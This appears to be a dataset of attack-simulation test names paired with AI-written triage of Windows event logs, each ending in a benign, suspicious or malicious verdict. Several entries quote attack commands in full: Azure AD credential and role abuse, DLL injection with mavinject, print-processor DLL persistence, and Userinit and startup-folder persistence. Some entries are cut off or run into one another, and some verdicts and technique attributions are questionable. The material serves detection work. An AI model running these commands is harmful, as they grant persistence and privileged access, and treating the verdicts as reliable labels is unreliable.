   - The `wevtutil.exe` utility is being executed multiple times by `admin_test`. `wevtutil.exe` is typically used to query, modify, export event log information which could indicate an attempt to clear or export logs to obfuscate tracks—this is suspicious especially if not accompanied by a legitimate reason.

3. **Use of `whoami.exe` and `hostname.exe`:**  
   - There are logs showing the execution of `HOSTNAME.EXE` and `whoami.exe` by `admin_test`. While these can be used for legitimate purposes like querying system information, a series of such commands can suggest reconnaissance activity, especially if the account `admin_test` has not consistently performed such operations historically.

4. **Time Synchronization Events:**  
   - There are multiple time change events in the logs, involving the `svchost.exe` process. Although adjustments may happen during time synchronization, frequent small adjustments could be indicative of an attempt to tamper with event log timings.

### Potentially Suspicious Pattern:
- The execution of legitimate Windows utilities by `admin_test` in a sequence, the tampering with registry keys, and time synchronization events when observed together suggest possible suspicious activity, potentially indicating an effort to conduct stealth operations without being detected.

### Assessment:
Based on the activities highlighted:

- **Resolution: SUSPICIOUS**

### Guidance:
Given the observed suspicious behavior, especially involving sensitive registry changes and potential event log manipulation:
- **Conduct a deeper investigation** into the user account `admin_test` and its recent activities to ensure the legitimacy of these actions.
- **Review the integrity of critical Windows settings**, especially those altered by the PowerShell script.
- **Analyze network activity and external connections** for any unusual patterns that coincide with the timestamps of these logs.
- If necessary, **isolate the system** from the network to prevent potential data exfiltration or further compromise until the full extent of the activity is determined.
- **Increase monitoring** on this and similar systems for further anomalous activity.

Ensure all findings are documented, and coordinate with the incident response team to determine appropriate actions based on the investigation outcomes."
Azure AD Application Hijacking - App Registration,"### Analysis of Logs

Upon reviewing the provided logs across different categories (Application, Sysmon, Security, System, and Windows PowerShell), the following observations and assessment have been made:

#### 1. Windows PowerShell Activity:
- A Windows PowerShell script was executed using the command line: 
  ```
  ""powershell.exe"" & {Import-Module -Name AzureAD, $PWord = ConvertTo-SecureString -String \""p4sswd\"" -AsPlainText -Force, $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \""jonh@contoso.com\"", $Pword, Connect-AzureAD -Credential $Credential > $null, $app = Get-AzureADApplication -SearchString \""SuperApp\"" | Select-Object -First 1, if ($app -eq $null) { Write-Warning \""Application not found\""; exit }, $credNotAfter = (Get-Date).AddDays(1), $certNotAfter = (Get-Date).AddDays(2), $cert = New-SelfSignedCertificate -DnsName \""file.example.com\"" -FriendlyName \""fileCert\"" -CertStoreLocation Cert:\\CurrentUser\\My -KeyExportPolicy Exportable -Provider \""Microsoft Enhanced RSA and AES Cryptographic Provider\"" -NotAfter $certNotAfter, $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData()), New-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \""fileTest\"" -Usage Verify -Value $keyValue -EndDate $credNotAfter, $tenant = Get-AzureADTenantDetail, $auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint $cert.Thumbprint}
  ```
- The script contains several potentially suspicious activities:
  - The use of `ConvertTo-SecureString` with plain text passwords and creating an Azure AD credential object.
  - Searching for an Azure AD application with `Get-AzureADApplication`.
  - Generating a self-signed certificate using `New-SelfSignedCertificate` and immediately utilizing this certificate as an application key credential in `New-AzureADApplicationKeyCredential`.
  - Connecting to Azure AD using the newly created certificate.
  
These actions strongly indicate a potential compromise involving Azure AD application manipulation, which could lead to unauthorized access or privilege escalation.

#### 2. Other Sysmon Events:
- Multiple instances of `conhost.exe` and `wevtutil.exe` were observed. These are generally seen as legitimate Microsoft processes, but frequent invocation, especially connected to administrative test accounts, could indicate attempts to interact with the event logs or spawn shell sessions.
  
#### 3. Security Events:
- The presence of Event ID 4672 indicates that special privilege assignment actions were performed, which is common during privileged user logons.
- Various 5379 events indicate Credential Manager access, which may be part of reconnaissance activities.

#### 4. System and Application Events:
- Regular updates and telemetry activities observed; these appear standard and do not show indications of malicious activity.

Process Injection via C#,"### Analysis of Windows Event Logs

The provided logs contain a series of system and security events captured from a Windows machine. The purpose of this analysis is to identify any indicators of malicious activity or security compromises. 

#### Noteworthy Observations

1. **Suspicious Process Execution**:
   - **PowerShell**: A PowerShell process (`powershell.exe`) is executed by `SERVER002\admin_test` at `2024-10-22 18:16:10`. While PowerShell is a legitimate tool, it is often used by attackers for executing scripts and payloads. The lack of command-line arguments in the log entry makes it difficult to determine the intent.

   - **Cmd Execution with Suspicious Path**: The `cmd.exe` process is executed with the command line containing a path: `""cmd.exe"" /c ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.004\\bin\\data.exe""`. This may indicate an execution of a potentially malicious executable (`data.exe`) stored in a temporary directory.

2. **Frequent `wevtutil` and `conhost` Process Execution**:
   - Processes related to `wevtutil.exe` and `conhost.exe` are created in quick succession. While `wevtutil.exe` is used for managing Windows Events and `conhost.exe` is associated with command-line or console-hosted applications, the frequency and pattern of these executions may warrant further investigation.

3. **Host Utilities and User Information Applications**:
   - Execution of utilities like `hostname.exe` and `whoami.exe` that are used for determining system and user information. These could be legitimate but might also be used by attackers to gather information about the compromised host.

4. **Time Manipulation Events**:
   - There are several events in the Security and System logs that indicate changes in system time. These are executed by the `svchost.exe` process which is legitimate. However, manipulation of system time can sometimes be used by attackers to alter logs or circumvent time-based security controls.

5. **Standard Maintenance and Operational Processes**:
   - The presence of normal processes such as `MicrosoftEdgeUpdate.exe`, `TiWorker.exe`, and `TrustedInstaller.exe` suggests standard operational or maintenance activities.

Azure AD - adding permission to application,"Upon reviewing the provided Sysmon and PowerShell logs, there are a few key points that warrant analysis. Here's a detailed breakdown of the identified activity:

1. **Frequent Execution of Powershell and Conhost Executables:**
    - Powershell (C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe) is being executed multiple times in quick succession.
    - Conhost.exe (Console Window Host) processes are accompanying these executions. 

2. **PowerShell Activity Analysis:**
    - A PowerShell script involving Azure AD activities was executed, as seen from logs `[AzureAD]`.
    - The script connects to AzureAD, creates a new application, service principal, assigns roles, and sets permissions. 
    - Use of ConverTo-SecureString to secure credentials is noted; however, the use of plain text (e.g., ""p4sswd"") raises concerns.

3. **Command-Line Operations:**
    - The complexity and nature of the command involving Azure AD should be scrutinized, particularly because it involves directory and application permissions in Azure, which if misconfigured or hijacked, could lead to unauthorized access or privilege escalation.
    - The presence of operations with high integrity level (`IntegrityLevel=High`) and execution from a privileged user context (SERVER002\admin_test) require validation against expected operational baselines.

4. **User and Process Anomalies:**
    - Consistent use of an 'admin_test' account primarily executing these actions raises suspicions. Such naming convention as ""admin_test"" might reflect temporary or testing accounts that might be misused.

5. **Signs of Potential Automation or Scripting:**
    - Rapid initiation and termination of processes (`conhost.exe` alongside `wevtutil.exe`, `whoami.exe`, and `hostname.exe`) might suggest script-based activities that could be legitimate; however, verifying their legitimacy is recommended.

6. **Miscellaneous Process Executions:**
    - Execution of Microsoft Edge Installer using system-level privileges is potentially benign if it correlates with scheduled auto-updates for software.

### Assessment:

Upon reviewing the above events and detailed command lines and operations, this activity appears **SUSPICIOUS**. The use of PowerShell to manage Azure AD roles, particularly with a potentially scripted approach and use of a potentially test or weak account (`admin_test`), needs further investigation. The following guidance is recommended:

### Actions to Proceed:
- **Validate Usage:** Ensure the PowerShell scripts executed and the accounts used align with IT policies or authorized administrative tasks.
- **Security Audit:** Conduct an Azure AD audit log review to find any unauthorized access or role changes.
- **User Validation:** Confirm the legitimacy and necessity of the 'admin_test' account and ensure secure credential practices.
- **Containment Measures:** If unauthorized activity is confirmed, suspend associated accounts and monitor for adverse activities.
- **Endpoint Monitoring:** Deploy detailed monitoring on the endpoint for unusual activities moving forward.

Decision: **Resolution marked as SUSPICIOUS.** Further investigation and validation of the events with internal security teams and stakeholders are critical to ascertain any malicious intent or unauthorized configuration activities."
Process Injection with Go using EtwpCreateEtwThread WinAPI,"Upon reviewing the provided Windows event logs, the following details and assessment have been gathered:

1. **PowerShell Activity:**
   - Multiple PowerShell events indicate the execution of a process with the command line argument pointing to a potentially suspicious executable located in a temporary directory: 
     ```
     powershell.exe & {C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\bin\x64\EtwpCreateEtwThread.exe -debug}
     ```
   - The use of a temporary directory for executing binaries is often indicative of unwanted or malicious activity, as legitimate applications typically do not execute from temporary locations in such a manner.

2. **Sysmon Logging Analysis:**
   - The Sysmon logs confirm the launch of the PowerShell process with the same suspicious command line. 
   - Additional process creations like `whoami.exe`, `HOSTNAME.EXE`, and various `conhost.exe` instances are observed. These in themselves are not inherently malicious but may relate to reconnaissance or operations conducted by a malicious actor.

Upon examining the provided log entries, several points indicate potentially suspicious behavior. Here's a breakdown of the findings:

### Windows PowerShell Logs

The PowerShell logs showcase a script that is performing actions related to password management:

- **Credential Management**: The script checks if a credential file exists, attempts to read it, and compares stored passwords.
- **Password Change Logic**: It changes passwords using `Set-ADAccountPassword`, and updates the credential file with the new password.
- **Execution Context**: The script is running with the user `admin_test`.

This script suggests that a user (or process) is attempting to change passwords in an automated way. This behavior can be expected in administrative scripts; however, if run without the proper controls or permissions, it could be indicative of an internal security threat or misconfiguration.

### Security Logs
The logs present multiple instances of Event ID `4798`, which relates to membership enumeration of security groups:

- **Users and Groups Accessed**: Various accounts, including `admin_test`, `Administrator`, `Guest`, and custom usernames like `lplui` and `testing`, have been queried.
- **Called by**: `C:\Windows\System32\CompatTelRunner.exe`, which is associated with telemetry data collection, appears to be the calling process. While this binary is legitimate, its intense use to list group membership can be unusual.

Events with `4672` involve privilege assignment, which is expected, but in combination with the enumeration activity, could be used to look for accounts with elevated privileges.

### Sysmon Logs

Sysmon presents processes being executed by `admin_test`:

- **Command Execution**: Commands like `hostname.exe`, `whoami.exe`, and multiple instances of `powershell.exe` and `wevtutil.exe` indicate potentially normal administrative activities, but they can be leveraged for enumeration and system reconnaissance in unauthorized scenarios.
  
- **High Integrity Levels**: The processes show high integrity, indicating administrative level execution. This again can be legitimate but requires context of who ran them and why.

## Assessment

**Suspicious Activity Noticed**:
- The automated password-changing script in PowerShell is typically not found on regular user workstations and requires additional verification about its intention and author.
- The use of `CompatTelRunner.exe` for enumerating security group memberships is not standard and could suggest its use had other purposes beyond telemetry, possibly for privilege escalation reconnaissance.
- Admin tasks performed by the `admin_test` account, especially if this is not a standard account for such tasks, could indicate misuse.

Based on the compilation of these activities, there is substantial evidence to warrant a deeper investigation into the intent and context of the actions, particularly focusing on the `admin_test` account's behavior and rights.

## Conclusion

**Resolution**: **SUSPICIOUS**

### Recommendations
- **Investigate the `admin_test` account**: Review its recent activities, password changes, and access logs comprehensively.
- **Review PowerShell Scripts**: Confirm legitimacy and intent of PowerShell scripts running, assess logs preceding the presented information for initial trigger or download.
- **Inspect Telemetry**: Assess the usage of `CompatTelRunner.exe` to determine if it was modified or used atypically.
- **Enhance Monitoring**: Implement stricter monitoring and alerting for changes to sensitive accounts and script executions, especially when involving password changes or privilege escalations.

Additional context from surrounding logs, user verification, and validation against expected baselines is critical for an in-depth understanding of these actions."
secedit used to create a Run key in the HKLM Hive,"Upon reviewing the provided log entries, several key findings and observations can be drawn:

### Application Log:
- The entries primarily involve the stopping of the 'edgeupdate' service. Stopping a service itself is not inherently malicious, especially since Microsoft Edge updates are common and expected.

### System Log:
- The logs detail normal system operations, such as the updates or adjustments in the time zone which correspond to typically benign behavior.

### Security Log:
- The key Security log entries, such as 4616, are related to system time changes performed by the svchost.exe process. These adjustments appear to be tied to time synchronization with an NTP service, which is a standard practice for maintaining system time accuracy.

### Sysmon Log:
- There is a series of logs capturing the execution of processes like `wevtutil.exe`, `conhost.exe`, `cmd.exe`, `whoami.exe`, `SecEdit.exe`, and various Microsoft Edge update executables. 
- The use of `cmd.exe` with parameters to configure the security database (`secedit /configure /db mytemplate.db`) is somewhat uncommon and might warrant a closer look to ensure no security policies are being altered maliciously.
- The Edge update processes involve multiple files run under `NT AUTHORITY\SYSTEM`, which is consistent with typical update processes for Microsoft applications. The processes `MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateSetup_X86` are observed several times, indicating update activities.

### Analysis:
- **Benign Observations:**
  - Frequent entries involving `MicrosoftEdgeUpdate.exe` indicate update activity, which is normal and expected.
  - The administration user executing utilities like `whoami` and `hostname` does not inherently indicate malicious activity unless correlated with other suspicious events.

- **Noteworthy Observations:**
  - The configuration and security settings modification with `SecEdit.exe` through command line arguments (`secedit /import` and `secedit /configure`) could be routine, but depending on the context and lack of more information on what template or changes were made, it could raise a flag for further validation.

### Conclusion:
Based on the logs provided and the context involved, there are no explicit indicators of malicious activity conclusively visible. The overall activity appears to follow patterns typical of scheduled updates and system maintenance functions, including Microsoft Edge updates and system time synchronization.

### Resolution: BENIGN
The overall activity in the logs is consistent with legitimate system operations and does not show definitive signs of malicious intent or compromise within the scope of the data provided. It might be prudent, however, to verify the specific templates involved in the `secedit` commands if there's room for concern regarding policy changes. Otherwise, the observed activities are routine and benign.

If there are specific areas of concern or additional context from the system, such as unusual behavior not included in these logs, further investigation may be warranted."
HKLM - Add malicious StubPath value to existing Active Setup Entry,"**Analysis of Logs:**

1. **Sysmon Logs:**
   - The logs show multiple executions of standard Windows and Microsoft Edge update processes like `MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateComRegisterShell64.exe`, and system utilities such as `whoami.exe` and `conhost.exe`. These events initially appear normal as these executables are part of routine operations related to Microsoft Edge maintenance and system commands.

2. **Suspicious PowerShell Activity:**
   - A Sysmon EventRecordID 17995 and a corresponding PowerShell event script indicate a Powershell command that changes the Windows registry key related to Active Setup. It sets the StubPath to `C:\Windows\System32\calc.exe` and runs `runonce.exe`. This is a significant indicator of malicious persistence or lateral movement attempts, often seen in malware trying to maintain persistence after a reboot.

3. **Execution of Command-Line Utilities:**
   - The use of legitimate tools such as `wevtutil.exe`, `whoami.exe`, and `conhost.exe` is common when attackers try to gather information or maintain access stealthily. These can be part of post-exploitation activities, especially given that they run frequently and in quick succession, indicative of potentially scripted or automated activity.

4. **Indicators of Malicious Intent:**
   - **Persistence through Registry Modification:** Modifying `StubPath` in the registry for running `calc.exe` using PowerShell suggests an attempt to load an arbitrary executable at user logon, which is common in attacks aimed at maintaining persistent access to the system.
   - **EdgeUpdater Anomalies:** The presence of Edge update processes running with command-line arguments and paths that might be exploited for UAC bypass or elevation of privileges could signal a misuse. However, without concrete evidence of tampered binaries, this remains suspicious rather than conclusively malicious.

5. **Security and System Logs:**
   - No direct evidence was found in the security and system logs to suggest an explicit breach, aside from the registry and scripting anomalies detected in the Sysmon and PowerShell logs.

6. **Time Consistency:**
   - Some system time adjustments are noted, potentially indicating attempts to cover tracks or manipulate event timelines. This should be cross-checked with time sync justifications to rule out harmless synchronization actions.

**Assessment and Resolution:**

- Given the observed registry modifications and suspicious usage of PowerShell, the presence of normal processes executing suspicious command lines indicates behavior that is more consistent with a penetration test or early-stage intrusion rather than typical user or system activity.
 
**Resolution: SUSPICIOUS**

**Guidance:**

1. **Investigate Further:**
   - Validate the modification in the registry key. Check for unauthorized changes to `StubPath` across the system's registry entries.
   - Analyze the binary hashes from the executable paths involved to ensure they match with known good binaries.
   - Monitor network traffic for any anomalies or unauthorized communication that might hint at a command-and-control setup.

2. **Remediation Actions:**
   - Revert any unauthorized registry changes especially those enabling persistence.
   - Review the system logs prior and subsequent to these events for additional context or indicative behavior.
   - Consider increasing monitoring on the host for potential Indicators of Compromise (IOCs).

3. **User Awareness & Security Posture:**
   - Educate users about safe handling and response to potential phishing or social engineering attempts that may have led to this PowerShell activity.
   - Review and bolster endpoint security measures, including application whitelisting, PowerShell logging, and Endpoint Detection and Response (EDR) deployment to capture a fuller picture of command history and process lineage."
Process Injection with Go using CreateThread WinAPI (Natively),"Upon analyzing the provided Windows event logs, several activities and behaviors are observed during the given timeframe. Here's a detailed breakdown of the logs to identify any suspicious activity or indicators of compromise:

### Security Logs:
- The Security log shows two instances of Event ID 4616, which relates to the system time being changed. While time changes can be legitimate, multiple changes in a short time span, especially when made by processes like `C:\Windows\System32\svchost.exe`, could suggest tampering attempts possibly related to timestamp evasion or persistence-related activities.

### Sysmon Logs:
- Multiple Sysmon Event ID 5 entries indicate the creation of processes with `conhost.exe` and `wevtutil.exe`. The frequent creation of `wevtutil.exe`, a command-line utility for managing Windows event logs, when executed by a user `SERVER002\admin_test` repeatedly is unusual and worth investigating further. This action might indicate attempts to clear or manipulate event logs.
  
- Sysmon Event ID 1 entries show processes like `HOSTNAME.EXE` and `whoami.exe` being executed, which are typically benign. However, the execution of `poweshell.exe` with the command line `CreateThreadNative.exe -debug` from a temporary directory is highly suspicious. PowerShell is often used to execute malicious scripts or commands. The specific reference to `CreateThreadNative.exe`, particularly with a `-debug` flag, could indicate the execution of a potentially malicious or debugging-related program possibly sourced from a non-standard path.

### Windows PowerShell Logs:
- Logs reveal execution activity with PowerShell, reinforcing the suspicious behavior identified in the Sysmon logs. The command appears to execute a program from a temporary directory, reinforcing the suspicion of potential malicious activity aiming to execute unsolicited code or scripts.

### System and Application Logs:
- The System and Application logs largely reflect routine operations inherent to Windows environments. However, they reiterate the time changes reflected in the Security logs.

### Suspicious Indicators:
1. **Unusual Time Change:** Repeated system time changes could indicate an attempt to hide user activity, manipulate logs, or circumvent scheduled tasks.
2. **Frequent Execution of Wevtutil:** Could be indicative of attempts to handle or manipulate log data behaviorally aligned with log-clearing strategies.
3. **Suspicious PowerShell Use & `CreateThreadNative.exe`:** The execution of a process from a temporary path using PowerShell with an unusual command line is a strong indicator of potentially malicious activities attempting lateral movement or privilege escalation.

### Resolution
Given the various indicators noted, particularly with `PowerShell` executing scripts from non-standard paths and the manipulation attempts of event logs, there is substantial evidence to consider this activity as:

- **MALICIOUS** - There is concrete evidence suggesting intentional malicious activity, specifically attempted evasion or system compromise tactics. Immediate action should be taken to isolate the machine, conduct an in-depth forensic analysis, and update security protocols to prevent further unauthorized actions.

### Guidance
- **Isolation:** Remove the compromised host from the network immediately.
- **Forensic Analysis:** Perform detailed forensics on the host and associated outputs (e.g., the suspicious `CreateThreadNative.exe`) to determine the intent and impact.
- **Review Privileged Access:** Ensure no unauthorized escalation of privileges occurred.
- **Security Measures:** Strengthen monitoring, apply timely patches, and educate users about best practices to prevent the recurrence of similar behavior."
Add Executable Shortcut Link to User Startup Folder,"**Detailed Analysis of Logs:**

1. **Windows PowerShell Log:**
   - A PowerShell script was executed that creates a shortcut pointing to `C:\Windows\System32\calc.exe` (Calculator) in the Startup folder. This ensures that the Calculator app would run every time a user logs in. The use of PowerShell to create startup items is a known technique often used for persistence by attackers. 
   - Command: `powershell.exe & {$Target = ""C:\Windows\System32\calc.exe""; $ShortcutLocation = ""$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\calc_exe.lnk""; $WScriptShell = New-Object -ComObject WScript.Shell; $Create = $WScriptShell.CreateShortcut($ShortcutLocation); $Create.TargetPath = $Target; $Create.Save()}`

2. **Sysmon Log:**
   - There is significant Sysmon logging showcasing process creation. Noteworthy events include several processes related to the Microsoft Edge Updater running with `SYSTEM` privileges which seem legitimate.
   - However, repeated use of `wevtutil.exe`, `whoami.exe`, `conhost.exe`, typically used for querying event logs and finding out user information, may suggest reconnaissance activity. 
   - Also, `powershell.exe` execution aligns with the suspicious command in the PowerShell log.

3. **Application and System Log:**
   - Primarily records updates and normal service operations, such as Windows Defender being enabled and Microsoft Edge updates being conducted, seemingly routine.
   - Windows Update Client entries indicate Microsoft Defender Antivirus updates, suggesting routine software updates.

**Assessment:**
- The PowerShell activity of creating a shortcut in the Startup folder for Calculator is certainly suspicious, especially if this was not an authorized administrative action, as non-standard use of startup folder entries may indicate an attempt to persist upon reboot.
- The combination of PowerShell command execution and the use of system tool utilities (such as `wevtutil.exe`) is often an indicator of malware trying to gather information or perform unauthorized operations.

**Threats or Risks Identified:**
- **Persistence Mechanisms**: Use of startup entries for programs commonly indicates attempts to maintain persistence.
- **Reconnaissance Techniques**: Usage of system utilities like `wevtutil.exe` might be indicative of attempted data gathering or log clearing activities.

**Guidance on How to Proceed:**
- Conduct a deeper investigation into the source of the PowerShell script execution. Review user activity logs and determine if unauthorized changes were made to startup entries.
- Check the integrity and source of executable files and their signatures using hash values for verification against a trusted database.
- Consider isolating the machine for forensic investigation to prevent any potential compromise from spreading.

**Resolution:**
- **SUSPICIOUS** - The activity does not look right and needs more focused investigation. The PowerShell script creating a startup shortcut is particularly concerning. Further investigation is needed to ascertain whether this was a legitimate administrative task or indicative of malicious activity."
Winlogon HKLM Userinit Key Persistence - PowerShell,"### Analysis:

1. **PowerShell Activity:**
   - The Windows PowerShell log shows a PowerShell script execution with `Set-ItemProperty` to modify the `Userinit` registry key to include `cmd.exe`, which can be indicative of persistence or backdoor setup. The command is:
     ```
     powershell.exe & {Set-ItemProperty ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" ""Userinit"" ""Userinit.exe, C:\Windows\System32\cmd.exe"" -Force}
     ```
   - Changing the `Userinit` value can redirect startup processes, which might be used to gain persistence on the machine.

2. **Suspicious Process Execution:**
   - **Process:** `powershell.exe`
   - **CommandLine:** Indicates potential malicious intent due to registry manipulation for persistence.

3. **User and Privileges:**
   - The user `admin_test` possesses high privileges, including sensitive privileges such as `SeDebugPrivilege`, which can be exploited for privilege escalation or other malicious activities.

4. **Time Change Events:**
   - There's an unusual time change recorded within the logs, but this could be a result of system sync or maintenance. Multiple events show time adjustments, but these usually accompany system updates or corrections and not inherently suspicious by themselves.

5. **Sysmon Logs:**
   - Numerous Sysmon event logs report processes related to Microsoft Edge Update which appear benign and routine, occurring with the usual hierarchical parent-child process structures.
   
6. **Security Logs:**
   - The presence of Event ID 4634 and 4624 indicates login and logout activity, and potentially an event related to privileged actions by `admin_test`.

### Assessment:
The presence of PowerShell modifying the `Userinit` registry key to include `cmd.exe` is an indicator of possible malicious persistence. Typically, benign processes do not modify Userinit entries to include command prompts, as it allows command line execution on every user logon, often used by attackers for maintaining access.

### Identified Threats/Risks:
- The manipulation of the `Userinit` key in the registry is concerning and suggests unauthorized changes potentially for malicious persistence.

### Guidance:
1. **Immediate Action:**
   - Investigate and rectify the registry change done by the PowerShell command.
   - Conduct a thorough examination of the system for any other unauthorized changes or suspicious files.

2. **Further Investigation:**
   - Analyze historical logs to see when this script was first executed.
   - Perform a comprehensive security assessment to ensure no other security controls have been bypassed.

3. **Mitigation Measures:**
   - Apply system hardening techniques, monitor for unusual registry changes, and restrict permissions for non-admin users on privileged registry paths.

### Resolution:
- **MALICIOUS** - Based on the PowerShell command modifying registry for persistence, this activity is deemed malicious. Further investigation and remediation are strongly recommended."
Process Injection via Extra Window Memory (EWM) x64 executable,"Based on the analysis of the provided logs, several indicators suggest potentially suspicious and malicious activity on the system.

1. **Sysmon Log Analysis**:
   - The Sysmon log records the execution of `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.011\\bin\\data.011_x64.exe` launched by PowerShell. This file is executed from a temporary directory, which is often used for malicious payload execution.
   - The use of PowerShell to execute a binary is a common tactic used by attackers to evade detection and execute malware.

2. **Security Log Analysis**:
   - Multiple `4624` (successful logon) events with privileges including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others are indicative of activities that might be used in privilege escalation or lateral movement.

3. **Windows PowerShell Log Analysis**:
   - The PowerShell log confirms the execution of the command involving `data.011_x64.exe`, reinforcing the suspicion around this activity.

4. **Application Log and Other Indicators**:
   - A variety of processes associated with unusual paths or temporary locations indicate atypical behavior. Events related to software protection service (SPP), while generally benign, coincide with the timing of the other suspicious events, which requires scrutiny.
   
5. **Overall Assessment**:
   - The presence of PowerShell being used to execute a file from a temporary directory, along with the execution of potentially harmful processes, strongly indicates malicious activity.
   - Given that these events are correlated with potentially harmful outcomes, they collectively contribute to the assessment of this scenario.

**Resolution: MALICIOUS**

**Guidance on How to Proceed**:
1. **Isolate the System**: Immediately isolate the affected system from the network to prevent further potential spread or communication with an attacker's infrastructure.
2. **Collect Forensic Evidence**: Gather and preserve all relevant logs, memory dumps, and files for further forensic analysis.
3. **Scan for Malware**: Use updated anti-malware tools to scan and remove any detected threats.
4. **Analyze Suspicious Files**: Further analyze the suspicious `data.011_x64.exe` file and other related binaries using sandbox or static analysis tools.
5. **Review and Harden Security Policies**: Review the security policies, especially concerning PowerShell execution policies, user permissions, and privilege assignments.
6. **Monitor for Lateral Movement**: Set up monitoring to detect any signs of lateral movement or further malicious activity on other systems.

This assessment underscores the importance of continuous monitoring and timely incident response measures to mitigate and remediate potential threats effectively."
Print Processors,"Upon examining the event logs provided, several key activities raise concern:

1. **PowerShell Usage**: There are several PowerShell commands being executed that manipulate services and copy files to system directories. Specifically, there is a command that checks and alters the Spooler service startup type, stops the service, copies a DLL to the print processor path, modifies registry entries related to print processors, and restarts the Spooler service.

   PowerShell Command:
   ```
   powershell.exe & { if( $(get-service -Name spooler).StartType -eq ""Disabled"") {Set-Service -Name ""spooler"" -StartupType Automatic}, net stop spooler, Copy-Item ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.012\\bin\\fileTest.dll"" C:\\Windows\\System32\\spool\\prtprocs\\x64\\fileTest.dll, reg add ""HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors\\file"" /v ""Driver"" /d ""fileTest.dll"" /t REG_SZ /f, net start spooler, if(0){, Restart-Computer, }}
   ```

   This sequence of actions closely aligns with known attack techniques involving PrintNightmare vulnerabilities, where malicious DLLs are injected into printer directories to escalate privileges or execute malicious payloads.

2. **Event IDs and Systems Modified**:
   - **Sysmon Logs Event ID 1 and 5**: Processes such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `powershell.exe` are executed by user `SERVER002\admin_test`. While `hostname.exe` and `whoami.exe` serve benign purposes (identifying system and user), `powershell.exe` executing with high integrity level and the described script strongly indicates suspicious, if not outright malicious, behavior.
   - **Network Command Execution (Net.exe, Net1.exe)**: The use of net commands to control the spooler service in conjunction with the registry changes and DLL copying further supports the malicious usage scenario.

3. **Security Logs**: Elevated privileges were detected (Event ID 4672), granting extensive rights such as `SeTakeOwnershipPrivilege`, `SeLoadDriverPrivilege`, `SeDebugPrivilege`, etc., which play vital roles in potential exploitation and lateral movement within the system.

Given this thorough review, the events and activities observed sufficiently indicate malicious behavior due to the combination of:
- System changes and DLL insertions via PowerShell.
- Curious use of Windows services like wevtutil.exe frequently used in log tampering attempts.
- Registry modifications related to print processing, likely reflecting tactics to exploit Print Spooler vulnerabilities.

**Assessment**: MALICIOUS

**Actionable Guidance**:
1. **Immediate Containment**: Isolate the host (Server002) from the network to prevent further potential compromise.
2. **Eradication**: Investigate and remove the `fileTest.dll` from the print processor directory and any registry changes made during the PowerShell commands.
3. **Remediation**: Patch the system to mitigate known vulnerabilities related to Print Spooler exploits.
4. **Further Investigation**: Conduct a thorough forensic analysis to identify further compromises or lateral movement. Monitor for subsequent suspicious PowerShell or related activity across the network.
5. **Incident Response**: Engage the incident response team to handle the breach comprehensively and ensure all affected systems are secured."
Process Injection via mavinject.exe,"Upon reviewing the provided Windows Sysmon, System, Application, Security, and PowerShell logs, the following analysis and observations are noted:

### Anomalous Behavior Identified:

1. **PowerShell Script with Suspicious Command Usage:**
   - There is a repetitive use of PowerShell executing with a command/script: 
     ```
     ""powershell.exe"" & {$mypid = (Start-Process notepad -PassThru).id, mavinject $mypid /INJECTRUNNING \""""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.001\\src\\x64\\data.001.dll\"""", Stop-Process -processname notepad}
     ```
   - This command involves the use of `Start-Process` to open Notepad and then inject a DLL (`data.001.dll`) using the `mavinject` command, followed by stopping Notepad. DLL injection is a common technique used in malware attacks to inject malicious code into legitimate processes.

2. **Frequent Invocation of Sysmon Event 5:**
   - Multiple instances of processes such as `WindowsPowerShell`, `wevtutil.exe`, and `conhost.exe` are logged:
     - `wevtutil.exe` usage to export logs: `""C:\\Windows\\system32\\wevtutil.exe"" epl Microsoft-Windows-Sysmon/Operational C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\TempLog.evtx` is logged consistently. While `wevtutil` is a legitimate utility, frequent and unscheduled usage, especially exporting logs, may indicate an attempt to cover tracks or perform unauthorized monitoring.

3. **Execution of Processes Without Parent Process Information:**
   - Events such as the invocation of `whoami.exe` and `hostname.exe` with no clear parent process information are observed. These could have been triggered indirectly through a compromised mechanism or job.

### Assessment:

- The use of DLL injection techniques involving PowerShell and the strange usage of utility processes (`wevtutil.exe`) are clear signs of potentially suspicious and malicious activity. Such behavior is typical for an advanced persistent threat (APT) or penetration testing activity testing resilience and persistence in a system by trying to mask activities or by code execution in a non-traditional manner.
  
- The absence of typical parent-child process chains in some executions suggests either process tampering or other forms of process creation anomalies, which are considered suspicious.

### Resolution: MALICIOUS

Given the context and nature of DLL injection through PowerShell, suspect manipulation and export of event logs, and anomalous process behaviors all hint towards malicious intent. It is advised to:

1. Perform a thorough inspection and initiate incident response procedures to contain and mitigate potential impacts.
2. Analyze the extent of the compromise, focusing on unauthorized access or changes to system resources.
3. Review and update security measures, including PowerShell script restrictions and improved Sysmon configuration to flag similar events in the future.
4. Preserve and analyze additional logs and potential artifacts for further forensic investigation.

Proactive threat hunting across similar environments and increased security monitoring pace is also recommended to handle any further infiltration."
Azure AD - Add Company Administrator Role to a user,"### Detailed Analysis:

Upon analyzing the provided logs from the Windows host, several elements stand out that require close scrutiny:

#### Windows PowerShell Log:
- **EventID 600**: Multiple PowerShell commands are executed involving the `Import-Module MSOnline`, credential manipulation using `ConvertTo-SecureString`, and `New-Object -TypeName System.Management.Automation.PSCredential`. A key operation is the `Add-MsolRoleMember` which aims to add an email as ""Company Administrator"". This is an unauthorized privilege escalation attempt.
  
